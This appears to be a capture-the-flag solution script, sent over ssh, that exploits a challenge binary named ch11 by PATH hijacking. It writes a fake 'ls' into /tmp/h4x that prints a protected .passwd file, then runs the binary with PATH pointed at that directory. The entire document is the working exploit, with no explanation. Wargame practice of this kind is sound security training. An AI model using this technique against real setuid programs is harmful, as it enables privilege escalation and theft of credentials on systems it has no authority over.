# ssh ... < commands.sh

mkdir -p /tmp/h4x

cat << EOF > /tmp/h4x/ls
#!/bin/bash
/bin/cat .passwd
EOF
chmod +x /tmp/h4x/ls

PATH=/tmp/h4x ./ch11